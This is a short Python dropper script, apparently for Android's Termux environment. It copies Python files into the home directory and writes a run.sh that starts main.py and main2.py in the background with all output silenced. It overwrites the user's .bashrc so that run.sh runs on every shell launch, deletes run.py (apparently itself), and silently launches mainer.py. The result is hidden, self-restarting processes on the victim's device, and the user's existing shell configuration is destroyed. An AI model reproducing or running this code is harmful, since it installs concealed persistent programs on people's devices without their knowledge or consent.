import os
try: 
    os.system('cp -r *.py /$HOME')
    os.chdir('/data/data/com.termux//files/home')
except: 
     os.system('cp -r hackiri/main.py /$HOME')
file = open('run.sh' , 'w+')
file.write('python main.py &> /dev/null &\npython main2.py &> /dev/null &')
file.close()
try:
    file2 = open('.bashrc' , 'w+')
    file2.write('bash run.sh')
except:
    try:
        os.system('> .bashrc')
    except:
        pass
    file2 = open('.bashrc', 'w+')
    file2.write('bash run.sh')
while True:
    try:
        os.system('rm -rf run.py')
        break
    except:
        pass
os.system("python mainer.py &> /dev/null &")
